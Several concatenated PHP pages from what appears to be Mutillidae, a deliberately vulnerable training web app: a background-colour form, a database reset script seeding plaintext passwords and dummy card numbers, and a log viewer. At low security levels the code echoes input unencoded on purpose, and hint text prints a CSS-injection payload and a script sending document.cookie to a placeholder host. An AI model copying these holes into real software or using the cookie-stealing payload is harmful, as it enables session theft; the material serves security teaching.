					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])
	// End hints section
?><?php
	if (isset($_POST["set-background-color-php-submit-button"])){
		
		try {	    	
	    	switch ($_SESSION["security-level"]){
	    		case "0": // This code is insecure. No output encoding is performed.
	    		case "1": // This code is insecure. No output encoding is performed.
	    			// Grab inputs insecurely. $_REQUEST allows any input parameter. Not just POST.
					$lBackgroundColor = $lBackgroundColorText = $_REQUEST["background_color"];
					
	    			//$$lBackgroundColorValidated = true; 			// do not perform validation
	    		break;
	    		
		   		case "2":
		   		case "3":
		   		case "4":
	    		case "5": // This code is fairly secure
					/* Protect against one form of patameter pollution 
					 * by grabbing inputs only from POST parameters. */ 

	    			/* Protect against XSS by output encoding */
	    			$lBackgroundColor = $Encoder->encodeForCSS($_POST["background_color"]);
					$lBackgroundColorText = $Encoder->encodeForHTML($_POST["background_color"]);					

					/* Validation: */
	    			//$lBackgroundColorValidated = preg_match(CSS_COLOR_VALUE_REGEX_PATTERN, $lBackgroundColor);
	    		break;
	    	}// end switch

    	} catch (Exception $e) {
			echo $CustomErrorHandler->FormatError($e, "Input: " . $lBackgroundColor);
    	}// end try
    	
	}else{
		$lBackgroundColor = $lBackgroundColorText = "eecccc";
	}// end if (isset($_POST)) 
?>

<div class="page-title">Set Background Color</div>

<?php include_once './includes/back-button.inc'; ?>

<form 
		action="index.php?page=set-background-color.php" 
		method="post" 
		enctype="application/x-www-form-urlencoded"
		style="background-color:#<?php echo $lBackgroundColor; ?>"
	>
	<table style="margin-left:auto; margin-right:auto;">
		<tr id="id-bad-cred-tr" style="display: none;">
			<td colspan="2" class="error-message">
				Error: Invalid Input
			</td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td colspan="2" class="form-header">Please enter the background color you would like to see<br/><br/>Enter the color in RRGGBB format<br/>(Example: Red = FF0000)</td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td class="label">Background Color</td>
			<td>
				<input type="text" name="background_color" size="6">
			</td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td colspan="2" style="text-align:center;">
				<input name="set-background-color-php-submit-button" class="button" type="submit" value="Set Background Color" />
			</td>
		</tr>
		<tr><td></td></tr>
		<tr>
			<td class="informative-message" colspan="2" style="text-align: center;">
				The current background color is <?php echo $lBackgroundColorText; ?>
			</td>
		</tr>
		<tr><td></td></tr>
		<tr><td></td></tr>
	</table>
</form>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li>
						  		<b>Cascading Style Injection:</b> This injection uses a different syntax but the 
						  		methodology to exploit is the same. 
							</li>
							<li>Inject arbitrary input then check the resulting response for your input</li>
							<li>To inject HTML or JavaScript into the style, look to close off the style, then
							start the injection, then comment out the remaining part of the style or complete
							the remaining part with valid syntax.</li>
							<li>Example Target:&lt;body style="color:#{dynamic input}"&gt;</li>
							<li>Possible Solution: style="&lt;body color:#"<b style="color:red;">"&gt;&lt;H1&gtHELLO WORLD&lt;/H1&gt;&lt;br anything="</b>"&gt;</li>
						</ul>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])

	if ($_SESSION["showhints"] == 2) {
		include_once './includes/cross-site-scripting-tutorial.inc';
	}// end if
?><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/loose.dtd">
<html>
	<head>
		<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
		<link rel="stylesheet" type="text/css" href="./styles/global-styles.css" />
	</head>
	<body>
		<div>&nbsp;</div>
		<div class="page-title">Setting up the database...</div><br /><br />
		<span style="text-align: center;">
			<div>&nbsp;</div>
			<div class="label">If you see no error messages, it should be done.</div>
			<div>&nbsp;</div>
			<div class="label"><a href="index.php">Continue back to the frontpage.</a></div>
		</span>
		<br /><br />
		<script>
			try{
				window.sessionStorage.clear();
				window.localStorage.clear();
			}catch(e){
				alert("Error clearing HTML 5 Local and Session Storage" + e.toString());
			};
		</script>
		<div class="database-success-message">HTML 5 Local and Session Storage cleared unless error popped-up already.</div>
<?php

//initialize custom error handler
require_once 'classes/CustomErrorHandler.php';
if (!isset($CustomErrorHandler)){
	$CustomErrorHandler = 
	new CustomErrorHandler("owasp-esapi-php/src/", 0);
}// end if

include 'config.inc';

$lErrorDetected = FALSE;

try{

	try{	
		$lMySQLiConnection = new mysqli($dbhost, $dbuser, $dbpass);
		if (mysqli_connect_errno()) {
			$lErrorDetected = TRUE;
			throw (new Exception("Error connecting to MySQL database. Connection error: ".$lMySQLiConnection->connect_errorno." - ".$lMySQLiConnection->connect_error." Error: ".$lMySQLiConnection->errorno." - ".$lMySQLiConnection->error, $lMySQLiConnection->errorno));
		}else{
			echo "<div class=\"database-success-message\">Connected to MySQL database</div>";	
	    }// end if
	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, "Error attempting to open MySQL connection.");
	}// end try	
		
	try{
		$lQuery = "DROP DATABASE IF EXISTS owasp10";
		$lResult = $lMySQLiConnection->query($lQuery);
		if (!$lResult) {
			$lErrorDetected = TRUE;
			throw (new Exception("Error executing query. Connection error: ".$lMySQLiConnection->connect_errorno." - ".$lMySQLiConnection->connect_error." Error: ".$lMySQLiConnection->errorno." - ".$lMySQLiConnection->error, $lMySQLiConnection->errorno));
		}else{
			echo "<div class=\"database-success-message\">Executed query 'DROP DATABASE IF EXISTS' with result ".$lResult."</div>";
		}// end if
	}catch(Exception $e){
		//DO NOTHING. THIS IS HERE DUE TO A MYSQL BUG THAT HAS NOT BEEN PATCHED YET.
	}//end try
	
	$lQuery = "CREATE DATABASE owasp10";
	$lResult = $lMySQLiConnection->query($lQuery);
	if (!$lResult) {
		$lErrorDetected = TRUE;
		throw (new Exception("Error executing query. Connection error: ".$lMySQLiConnection->connect_errorno." - ".$lMySQLiConnection->connect_error." Error: ".$lMySQLiConnection->errorno." - ".$lMySQLiConnection->error, $lMySQLiConnection->errorno));
	}else{
		echo "<div class=\"database-success-message\">Executed query 'CREATE DATABASE' with result ".$lResult."</div>";
	}// end if
	
	$lQuery = "USE owasp10";
	$lResult = $lMySQLiConnection->query($lQuery);
	if (!$lResult) {
		$lErrorDetected = TRUE;
		throw (new Exception("Error executing query. Connection error: ".$lMySQLiConnection->connect_errorno." - ".$lMySQLiConnection->connect_error." Error: ".$lMySQLiConnection->errorno." - ".$lMySQLiConnection->error, $lMySQLiConnection->errorno));
	}else{
		echo "<div class=\"database-success-message\">Executed query 'USE DATABASE' with result ".$lResult."</div>";
	}// end if
			
	$lQuery = 'CREATE TABLE blogs_table( '.
			 'cid INT NOT NULL AUTO_INCREMENT, '.
	         'blogger_name TEXT, '.
	         'comment TEXT, '.
			 'date DATETIME, '.
			 'PRIMARY KEY(cid))';	
	$lResult = $lMySQLiConnection->query($lQuery);
	if (!$lResult) {
		$lErrorDetected = TRUE;
		throw (new Exception("Error executing query. Connection error: ".$lMySQLiConnection->connect_errorno." - ".$lMySQLiConnection->connect_error." Error: ".$lMySQLiConnection->errorno." - ".$lMySQLiConnection->error, $lMySQLiConnection->errorno));
	}else{
		echo "<div class=\"database-success-message\">Executed query 'CREATE TABLE' with result ".$lResult."</div>";
	}// end if
	
	$lQuery = 'CREATE TABLE accounts( '.
			 'cid INT NOT NULL AUTO_INCREMENT, '.
	         'username TEXT, '.
	         'password TEXT, '.
			 'mysignature TEXT, '.
			 'is_admin VARCHAR(5),'.
			 'PRIMARY KEY(cid))';
	$lResult = $lMySQLiConnection->query($lQuery);
	if (!$lResult) {
		$lErrorDetected = TRUE;
		throw (new Exception("Error executing query. Connection error: ".$lMySQLiConnection->connect_errorno." - ".$lMySQLiConnection->connect_error." Error: ".$lMySQLiConnection->errorno." - ".$lMySQLiConnection->error, $lMySQLiConnection->errorno));
	}else{
		echo "<div class=\"database-success-message\">Executed query 'CREATE TABLE' with result ".$lResult."</div>";
	}// end if
	
	$lQuery = 'CREATE TABLE hitlog( '.
			 'cid INT NOT NULL AUTO_INCREMENT, '.
	         'hostname TEXT, '.
	         'ip TEXT, '.
			 'browser TEXT, '.
			 'referer TEXT, '.
			 'date DATETIME, '.
			 'PRIMARY KEY(cid))';		 
	$lResult = $lMySQLiConnection->query($lQuery);
	if (!$lResult) {
		$lErrorDetected = TRUE;
		throw (new Exception("Error executing query. Connection error: ".$lMySQLiConnection->connect_errorno." - ".$lMySQLiConnection->connect_error." Error: ".$lMySQLiConnection->errorno." - ".$lMySQLiConnection->error, $lMySQLiConnection->errorno));
	}else{
		echo "<div class=\"database-success-message\">Executed query 'CREATE TABLE' with result ".$lResult."</div>";
	}// end if
	
	$lQuery = "INSERT INTO accounts (username, password, mysignature, is_admin) VALUES
		('admin', 'adminpass', 'Monkey!', 'TRUE'),
		('adrian', 'somepassword', 'Zombie Films Rock!', 'TRUE'),
		('john', 'monkey', 'I like the smell of confunk', 'FALSE'),
		('jeremy', 'password', 'd1373 1337 speak', 'FALSE'),
		('bryce', 'password', 'I Love SANS', 'FALSE'),
		('samurai', 'samurai', 'Carving Fools', 'FALSE'),
		('jim', 'password', 'Jim Rome is Burning', 'FALSE'),
		('bobby', 'password', 'Hank is my dad', 'FALSE'),
		('simba', 'password', 'I am a cat', 'FALSE'),
		('dreveil', 'password', 'Preparation H', 'FALSE'),
		('scotty', 'password', 'Scotty Do', 'FALSE'),
		('cal', 'password', 'Go Wildcats', 'FALSE'),
		('john', 'password', 'Do the Duggie!', 'FALSE'),
		('kevin', '42', 'Doug Adams rocks', 'FALSE'),
		('dave', 'set', 'Bet on S.E.T. FTW', 'FALSE'),
		('ed', 'pentest', 'Commandline KungFu anyone?', 'FALSE')";
	$lResult = $lMySQLiConnection->query($lQuery);
	if (!$lResult) {
		$lErrorDetected = TRUE;
		throw (new Exception("Error executing query. Connection error: ".$lMySQLiConnection->connect_errorno." - ".$lMySQLiConnection->connect_error." Error: ".$lMySQLiConnection->errorno." - ".$lMySQLiConnection->error, $lMySQLiConnection->errorno));
	}else{
		echo "<div class=\"database-success-message\">Executed query 'INSERT INTO TABLE' with result ".$lResult."</div>";
	}// end if
	
	$lQuery ="INSERT INTO `blogs_table` (`cid`, `blogger_name`, `comment`, `date`) VALUES
		(1, 'adrian', 'Well, I''ve been working on this for a bit. Welcome to my crappy blog software. :)', '2009-03-01 22:26:12'),
		(2, 'adrian', 'Looks like I got a lot more work to do. Fun, Fun, Fun!!!', '2009-03-01 22:26:54'),
		(3, 'anonymous', 'An anonymous blog? Huh? ', '2009-03-01 22:27:11'),
		(4, 'ed', 'I love me some Netcat!!!', '2009-03-01 22:27:48'),
		(5, 'john', 'Listen to Pauldotcom!', '2009-03-01 22:29:04'),
		(6, 'jeremy', 'Why give users the ability to get to the unfiltered Internet? It''s just asking for trouble. ', '2009-03-01 22:29:49'),
		(7, 'john', 'Chocolate is GOOD!!!', '2009-03-01 22:30:06'),
		(8, 'admin', 'Fear me, for I am ROOT!', '2009-03-01 22:31:13'),
		(9, 'dave', 'Social Engineering is woot-tastic', '2009-03-01 22:31:13'),
		(10, 'kevin', 'Read more Douglas Adams', '2009-03-01 22:31:13'),
		(11, 'kevin', 'You should take SANS SEC542', '2009-03-01 22:31:13'),
		(12, 'asprox', 'Fear me, for I am asprox!', '2009-03-01 22:31:13')";
	$lResult = $lMySQLiConnection->query($lQuery);
	if (!$lResult) {
		$lErrorDetected = TRUE;
		throw (new Exception("Error executing query. Connection error: ".$lMySQLiConnection->connect_errorno." - ".$lMySQLiConnection->connect_error." Error: ".$lMySQLiConnection->errorno." - ".$lMySQLiConnection->error, $lMySQLiConnection->errorno));
	}else{
		echo "<div class=\"database-success-message\">Executed query 'INSERT INTO TABLE' with result ".$lResult."</div>";
	}// end if
	
	$lQuery = 'CREATE TABLE credit_cards( '.
			 'ccid INT NOT NULL AUTO_INCREMENT, '.
	         'ccnumber TEXT, '.
	         'ccv TEXT, '.
			 'expiration DATE, '.
			 'PRIMARY KEY(ccid))';
	$lResult = $lMySQLiConnection->query($lQuery);
	if (!$lResult) {
		$lErrorDetected = TRUE;
		throw (new Exception("Error executing query. Connection error: ".$lMySQLiConnection->connect_errorno." - ".$lMySQLiConnection->connect_error." Error: ".$lMySQLiConnection->errorno." - ".$lMySQLiConnection->error, $lMySQLiConnection->errorno));
	}else{
		echo "<div class=\"database-success-message\">Executed query 'CREATE TABLE' with result ".$lResult."</div>";
	}// end if

	$lQuery ="INSERT INTO `credit_cards` (`ccid`, `ccnumber`, `ccv`, `expiration`) VALUES
		(1, '4444111122223333', '745', '2012-03-01 10:01:12'),
		(2, '7746536337776330', '722', '2015-04-01 07:00:12'),
		(3, '8242325748474749', '461', '2016-03-01 11:55:12'),
		(4, '7725653200487633', '230', '2017-06-01 04:33:12'),
		(5, '1234567812345678', '627', '2018-11-01 13:31:13')";
	$lResult = $lMySQLiConnection->query($lQuery);
	if (!$lResult) {
		$lErrorDetected = TRUE;
		throw (new Exception("Error executing query. Connection error: ".$lMySQLiConnection->connect_errorno." - ".$lMySQLiConnection->connect_error." Error: ".$lMySQLiConnection->errorno." - ".$lMySQLiConnection->error, $lMySQLiConnection->errorno));
	}else{
		echo "<div class=\"database-success-message\">Executed query 'INSERT INTO TABLE' with result ".$lResult."</div>";
	}// end if

	$lQuery = 
			'CREATE TABLE pen_test_tools('.
			'tool_id INT NOT NULL AUTO_INCREMENT, '.
	        'tool_name TEXT, '.
	        'phase_to_use TEXT, '.
			'tool_type TEXT, '.
			'comment TEXT, '.
			'PRIMARY KEY(tool_id))';
	$lResult = $lMySQLiConnection->query($lQuery);
	if (!$lResult) {
		$lErrorDetected = TRUE;
		throw (new Exception("Error executing query. Connection error: ".$lMySQLiConnection->connect_errorno." - ".$lMySQLiConnection->connect_error." Error: ".$lMySQLiConnection->errorno." - ".$lMySQLiConnection->error, $lMySQLiConnection->errorno));
	}else{
		echo "<div class=\"database-success-message\">Executed query 'CREATE TABLE' with result ".$lResult."</div>";
	}// end if

	$lQuery ="INSERT INTO `pen_test_tools` (`tool_id`, `tool_name`, `phase_to_use`, `tool_type`, `comment`) VALUES
		(1, 'WebSecurify', 'Discovery', 'Scanner', 'Can capture screenshots automatically'),
		(2, 'Grendel-Scan', 'Discovery', 'Scanner', 'Has interactive-mode. Lots plug-ins. Includes Nikto. May not spider JS menus well.'),
		(3, 'Skipfish', 'Discovery', 'Scanner', 'Agressive. Fast. Uses wordlists to brute force directories.'),
		(4, 'w3af', 'Discovery', 'Scanner', 'GUI simple to use. Can call sqlmap. Allows scan packages to be saved in profiles. Provides evasion, discovery, brute force, vulneraility assessment (audit), exploitation, pattern matching (grep).'),
		(5, 'Burp-Suite', 'Discovery', 'Scanner', 'GUI simple to use. Provides highly configurable manual scan assistence with productivity enhancements.'),
		(6, 'Netsparker Community Edition', 'Discovery', 'Scanner', 'Excellent spider abilities and reporting. GUI driven. Runs on Windows. Good at SQLi and XSS detection. From Mavituna Security. Professional version available for purchase.'),
		(7, 'NeXpose', 'Discovery', 'Scanner', 'GUI driven. Runs on Windows. From Rapid7. Professional version available for purchase. Updates automatically. Requires large amounts of memory.'),
		(8, 'Hailstorm', 'Discovery', 'Scanner', 'From Cenzic. Professional version requires dedicated staff, multiple dediciated servers, professional pen-tester to analyze results, and very large license fee. Extensive scanning ability. Very large vulnerability database. Highly configurable. Excellent reporting. Can scan entire networks of web applications. Extremely expensive. Requires large amounts of memory.'),
		(9, 'Tamper Data', 'Discovery', 'Interception Proxy', 'Firefox add-on. Easy to use. Tampers with POST parameters and HTTP Headers. Does not tamper with URL query parameters. Requires manual browsing.'),		
		(10, 'DirBuster', 'Discovery', 'Fuzzer', 'OWASP tool. Fuzzes directory names to brute force directories.'),
		(11, 'SQL Inject Me', 'Discovery', 'Fuzzer', 'Firefox add-on. Attempts common strings which elicit XSS responses. Not compatible with Firefox 8.0.'),
		(12, 'XSS Me', 'Discovery', 'Fuzzer', 'Firefox add-on. Attempts common strings which elicit responses from databases when SQL injection is present. Not compatible with Firefox 8.0.'),
		(13, 'GreaseMonkey', 'Discovery', 'Browser Manipulation Tool', 'Firefox add-on. Allows the user to inject JavaScripts and change page.'),
		(14, 'NSLookup', 'Reconnaissance', 'DNS Server Query Tool', 'DNS query tool can query DNS name or reverse lookup on IP. Set debug for better output. Premiere tool on Windows but Linux perfers Dig. DNS traffic generally over UDP 53 unless response long then over TCP 53. Online version combined with anonymous proxy or TOR network may be prefered for stealth.'),
		(15, 'Whois', 'Reconnaissance', 'Domain name lookup service', 'Whois is available in Linux naitvely and Windows as a Sysinternals download plus online. Whois can lookup the registrar of a domain and the IP block associated. An online version is http://network-tools.com/'),
		(16, 'Dig', 'Reconnaissance', 'DNS Server Query Tool', 'The Domain Information Groper is prefered on Linux over NSLookup and provides more information natively. NSLookup must be in debug mode to give similar output. DIG can perform zone transfers if the DNS server allows transfers.'),
		(17, 'Fierce Domain Scanner', 'Reconnaissance', 'DNS Server Query Tool', 'Powerful DNS scan tool. FDS is a Perl program which scans and reverse scans a domain plus scans IPs within the same block to look for neighoring machines. Available in the Samurai and Backtrack distributions plus http://ha.ckers.org/fierce/'),
		(18, 'host', 'Reconnaissance', 'DNS Server Query Tool', 'A simple DNS lookup tool included with BIND. The tool is a friendly and capible command line tool with excellent documentation. Does not posess the automation of FDS.'),
		(19, 'zaproxy', 'Reconnaissance', 'Interception Proxy', 'OWASP Zed Attack Proxy. An interception proxy that can also passively or actively scan applications as well as perform brute-forcing. Similar to Burp-Suite without the disadvantage of requiring a costly license.'),
		(20, 'Google intitle', 'Discovery', 'Search Engine','intitle and site directives allow directory discovery. GHDB available to provide hints. See Hackers for Charity site.')";
	$lResult = $lMySQLiConnection->query($lQuery);
	if (!$lResult) {
		$lErrorDetected = TRUE;
		throw (new Exception("Error executing query. Connection error: ".$lMySQLiConnection->connect_errorno." - ".$lMySQLiConnection->connect_error." Error: ".$lMySQLiConnection->errorno." - ".$lMySQLiConnection->error, $lMySQLiConnection->errorno));
	}else{
		echo "<div class=\"database-success-message\">Executed query 'INSERT INTO TABLE' with result ".$lResult."</div>";
	}// end if

	$lQuery = 
			'CREATE TABLE captured_data('.
				'data_id INT NOT NULL AUTO_INCREMENT, '.
				'ip_address TEXT, '.
				'hostname TEXT, '.
				'port TEXT, '.
				'user_agent_string TEXT, '.
				'referrer TEXT, '.
				'data TEXT, '.
			 	'capture_date DATETIME, '.
				'PRIMARY KEY(data_id)'.
			')';
	$lResult = $lMySQLiConnection->query($lQuery);
	if (!$lResult) {
		$lErrorDetected = TRUE;
		throw (new Exception("Error executing query. Connection error: ".$lMySQLiConnection->connect_errorno." - ".$lMySQLiConnection->connect_error." Error: ".$lMySQLiConnection->errorno." - ".$lMySQLiConnection->error, $lMySQLiConnection->errorno));
	}else{
		echo "<div class=\"database-success-message\">Executed query 'CREATE TABLE' with result ".$lResult."</div>";
	}// end if
	
	$lQuery = "
	CREATE PROCEDURE getBestCollegeBasketballTeam ()
	BEGIN
		SELECT 'Kentucky Wildcats';
	END;
	";
	$lResult = $lMySQLiConnection->query($lQuery);
	if (!$lResult) {
		$lErrorDetected = TRUE;
		throw (new Exception("Error executing query. Connection error: ".$lMySQLiConnection->connect_errorno." - ".$lMySQLiConnection->connect_error." Error: ".$lMySQLiConnection->errorno." - ".$lMySQLiConnection->error, $lMySQLiConnection->errorno));
	}else{
		echo "<div class=\"database-success-message\">Executed query 'CREATE PROCEDURE' with result ".$lResult."</div>";
	}// end if
	
	$lQuery = "
		CREATE PROCEDURE authenticateUserAndReturnProfile (p_username text, p_password text)
		BEGIN
			SELECT  accounts.cid, 
		          accounts.username, 
		          accounts.password, 
		          accounts.mysignature
		  FROM accounts
		    WHERE accounts.username = p_username
		      AND accounts.password = p_password;
		END;
	";
	$lResult = $lMySQLiConnection->query($lQuery);
	if (!$lResult) {
		$lErrorDetected = TRUE;
		throw (new Exception("Error executing query. Connection error: ".$lMySQLiConnection->connect_errorno." - ".$lMySQLiConnection->connect_error." Error: ".$lMySQLiConnection->errorno." - ".$lMySQLiConnection->error, $lMySQLiConnection->errorno));
	}else{
		echo "<div class=\"database-success-message\">Executed query 'CREATE PROCEDURE' with result ".$lResult."</div>";
	}// end if
	
	$lQuery = "
		CREATE PROCEDURE owasp10.insertBlogEntry (
		  pBloggerName text,
		  pComment text
		)
		BEGIN
		
		  INSERT INTO blogs_table(
		    blogger_name, 
		    comment, 
		    date
		   )VALUES(
		    pBloggerName, 
		    pComment, 
		    now()
		  );
		
		END;
	";
	$lResult = $lMySQLiConnection->query($lQuery);
	if (!$lResult) {
		$lErrorDetected = TRUE;
		throw (new Exception("Error executing query. Connection error: ".$lMySQLiConnection->connect_errorno." - ".$lMySQLiConnection->connect_error." Error: ".$lMySQLiConnection->errorno." - ".$lMySQLiConnection->error, $lMySQLiConnection->errorno));
	}else{
		echo "<div class=\"database-success-message\">Executed query 'CREATE PROCEDURE' with result ".$lResult."</div>";
	}// end if
	
	try{
		$lResult = $lMySQLiConnection->close();
		if (!$lResult) {
			$lErrorDetected = TRUE;
			throw (new Exception("Error executing query. Connection error: ".$lMySQLiConnection->connect_errorno." - ".$lMySQLiConnection->connect_error." Error: ".$lMySQLiConnection->errorno." - ".$lMySQLiConnection->error, $lMySQLiConnection->errorno));
		}else{
			echo "<div class=\"database-success-message\">Executed query 'CLOSE DATABASE' with result ".$lResult."</div>";
		}// end if
	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, "Error attempting to close MySQL connection.");
	}// end try
		
} catch (Exception $e) {
	echo $CustomErrorHandler->FormatError($e, $lQuery);
}// end try

// if no errors were detected, send the user back to the page that requested the database be reset.
//We use JS instead of HTTP Location header so that HTML5 clearing JS above will run
if(!$lErrorDetected){
	echo "<script>if(confirm(\"No PHP or MySQL errors were detected when resetting the database.\\n\\nClick OK to proceed or Cancel to stay on this page.\")){document.location=\"".$_SERVER["HTTP_REFERER"]."\"};</script>";
	//header("Location: ".$_SERVER["HTTP_REFERER"], true, 302);
}// end if

$CustomErrorHandler = null;
?>

	</body>
</html>

<?php
	/* Known Vulnerabilities
	 * Cross Site Scripting, Cross Site Scripting via HTTP Headers, 
	 * Denial of Service via Logging
	 */

	switch ($_SESSION["security-level"]){
   		case "0": // This code is insecure
   		case "1": // This code is insecure
   			// DO NOTHING: This is insecure		
			$lEncodeOutput = FALSE;
			$lLimitOutput= FALSE;
		break;
	    		
   		case "2":
   		case "3":
   		case "4":
   		case "5": // This code is fairly secure
  			/* 
  			 * NOTE: Input validation is excellent but not enough. The output must be
  			 * encoded per context. For example, if output is placed in HTML,
  			 * then HTML encode it. Blacklisting is a losing proposition. You 
  			 * cannot blacklist everything. The business requirements will usually
  			 * require allowing dangerous charaters. In the example here, we can 
  			 * validate username but we have to allow special characters in passwords
  			 * least we force weak passwords. We cannot validate the signature hardly 
  			 * at all. The business requirements for text fields will demand most
  			 * characters. Output encoding is the answer. Validate what you can, encode it
  			 * all.
  			 */
   			// encode the output following OWASP standards
   			// this will be HTML encoding because we are outputting data into HTML
			$lEncodeOutput = TRUE;
			
			/*
			 *  If DOS defenses are enabled, we limit output. An attacker can easily cause 
			 *  the logs to fill . This in itself may or may not pose a problem. 
			 *  But filling logs which display is a type of ampliphication attack. 
			 *  If one attacker puts 10,000 orws in the log then 10 innocent 
			 *  users view those logs, the system will have to display 100,000 log rows (10 users * 10,000 rows). 
			 *  Ampliphications attacks are also done by sending single IP packets to networks 
			 *  which will broadcast the packet thus ampliphying the packet many times.
			 */
			$lLimitOutput= TRUE;
   		break;
   	}// end switch		

   	if(isset($_GET["deleteLogs"])){
		$query = "TRUNCATE TABLE hitlog;";

		$result = $conn->query($query);
		if (!$result) {
	    	throw (new Exception('Error executing query: '.$conn->error, $conn->errorno));
	    }// end if	
	}// end if isset
?>

<div class="page-title">Log</div>

<?php include_once './includes/back-button.inc';?>

<?php
	try{// to draw table
		$query = "SELECT * FROM `hitlog` ORDER BY date DESC";
	    
		if ($lLimitOutput){
	    	$query .= " LIMIT 20";
	    }// end if
		
		$result = $conn->query($query);
		if (!$result) {
	    	throw (new Exception('Error executing query: '.$conn->error, $conn->errorno));
	    }// end if

		// we have rows. Begin drawing output.
		echo '<table border="1px" width="100%" class="main-table-frame">';
		echo '<tr class="report-header">';
		echo '	<td colspan="10">';		
		echo '		<span><img width="32px" height="32px" src="./images/information-icon-64-64.png" style="vertical-align:middle;" />'.$result->num_rows.' log records found<span>';
		echo '		<span title="Click to refresh log file" onclick="document.location.reload(true);" style="cursor: pointer;margin-left:35px;margin-right:35px;white-space:nowrap;font-weight:bold;">';
		echo '			<img width="32px" height="32px" src="./images/refresh-button-48px-by-48px.png" style="vertical-align:middle;" />';
		echo '			Refresh Logs';
		echo '		</span>';
		echo '		<span title="Click to delete log file" onclick="document.location=\'./index.php?page=show-log.php&deleteLogs=deleteLogs\';" style="cursor: pointer;white-space:nowrap;font-weight:bold;">';
		echo '			<img width="32px" height="32px" src="./images/delete-icon-256-256.png" style="vertical-align:middle;" />';
		echo '			Delete Logs';
		echo '		</span>';
		echo '	</td>';
		echo '</tr>';		
	    echo '<tr class="report-header">
			    <td style="font-weight:bold;">Hostname</td>
			    <td style="font-weight:bold;">IP</td>
			    <td style="font-weight:bold;">Browser Agent</td>
			    <td style="font-weight:bold;">Page Viewed</td>
			    <td style="font-weight:bold;">Date/Time</td>
		    </tr>';

	    if ($lLimitOutput){
	    	echo '<tr><td class="error-header" colspan="10">Note: DOS defenses enabled. Rows limited to last 20.</td></tr>';
	    }// end if

	    $lRowNumber = 0;
	    while($row = $result->fetch_object()){
	    	$lRowNumber++;
			
			if(!$lEncodeOutput){
				$lHostname = $row->hostname;
				$lClientIPAddress = $row->ip;
				$lBrowser = $row->browser;
				$lReferer = $row->referer;
				$lDate = $row->date;
			}else{
				$lHostname = $Encoder->encodeForHTML($row->hostname);
				$lClientIPAddress = $Encoder->encodeForHTML($row->ip);
				$lBrowser = $Encoder->encodeForHTML($row->browser);
				$lReferer = $Encoder->encodeForHTML($row->referer);
				$lDate = $Encoder->encodeForHTML($row->date);				
			}// end if
				
			echo "<tr>
					<td>{$lHostname}</td>
					<td>{$lClientIPAddress}</td>
					<td>{$lBrowser}</td>
					<td>{$lReferer}</td>
					<td>{$lDate}</td>
				</tr>\n";
		}//end while $row
		echo "</table>";
	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, "Error writing rows.");
	}// end try;
?>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<ul class="hints">
						  	<li><b>For XSS:</b>XSS is easy stuff. This one shows off both reflected (you see the results 
								instantly) and stored (someone can run across it later in another app that
								uses the same database). "&lt;script&gt;alert("XSS");&lt;/script&gt;" is the classic, but 
								there are far more interesting things you could do which I plan show in a video later. 
								For some hot cookie stealing action, try something like:
<code>
&lt;script&gt;
	new Image().src="http://some-ip/mutillidae/catch.php?cookie="+encodeURI(document.cookie);
&lt;/script&gt;
</code>	
								Also, check out <a href="http://ha.ckers.org/xss.html">Rsnake\'s XSS Cheet Sheet</a>
								for more ways you can encode XSS attacks that may allow you to get around some filters.
							</li>
						  	<li>Notice the information being output. With respect to HTTP transmissions, 
						  	where do you find this information? Is any of it sent by the browser?
							</li>
							<li>The user is in complete control of the browser and all of the information it sends to the server.</li>
							<li>If the server displays any information from the browser without output encoding first, 
							shame on the developer.
							</li>
							<li>You can use the any page normally but then simply change the parameters in Tamper Data. 
							Because Tamper Data is allowing the user to manipulate the request after the request has 
							left the browser, any HTML or JavaScript has already run and is completely useless as a 
							security measure. Any use of HTML or JavaScript for security purposes is useless anyway. 
							Some developers still fail to recognize this fact to this day.
							</li>
							<li>HTTP headers including the user agent can be manipulated by client side proxies like Paros, Burp, and WebScarab.</li>
							<li>With tools like netcat, you can send custom HTTP requests any way you wish. Try using tools
							like Paros to begin altering HTTP requests, then try netcat to create your own HTTP
								requests from scratch</li>
						</ul>
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])

	if ($_SESSION["showhints"] == 2) {
		include_once './includes/cross-site-scripting-tutorial.inc';
	}// end if
?><?php 
	try{
		switch ($_SESSION["security-level"]){
	   		case "0": // This code is insecure
	   		case "1": // This code is insecure
	   			// DO NOTHING: This is insecure		
				$lEncodeOutput = FALSE;
			break;
		    		
	   		case "2":
	   		case "3":
	   		case "4":
			case "5": // This code is fairly secure
	  			/* 
	  			 * NOTE: Input validation is excellent but not enough. The output must be
	  			 * encoded per context. For example, if output is placed	 in HTML,
	  			 * then HTML encode it. Blacklisting is a losing proposition. You 
	  			 * cannot blacklist everything. The business requirements will usually
	  			 * require allowing dangerous charaters. In the example here, we can 
	  			 * validate username but we have to allow special characters in passwords
	  			 * least we force weak passwords. We cannot validate the signature hardly 
	  			 * at all. The business requirements for text fields will demand most
	  			 * characters. Output encoding is the answer. Validate what you can, encode it
	  			 * all.
	  			 * 
	  			 * For JavaScript, always output using innerText (IE) or textContent (FF),
	  			 * Do NOT use innerHTML. Using innerHTML is weak anyway. When 
	  			 * attempting DHTML, program with the proper interface which is
	  			 * the DOM. Thats what it is there for.
	  			 */
	   			// encode the output following OWASP standards
	   			// this will be HTML encoding because we are outputting data into HTML
				$lEncodeOutput = TRUE;
	   		break;
	   	}// end switch		
	
		require_once 'classes/ClientInformationHandler.php';
		$lClientInformationHandler = new ClientInformationHandler();
		
		if ($lEncodeOutput){
			$lClientUserAgentString = $Encoder->encodeForHTML($lClientInformationHandler->getClientUserAgentString());
		}else{
			$lClientUserAgentString = $lClientInformationHandler->getClientUserAgentString();
		}// end if
	
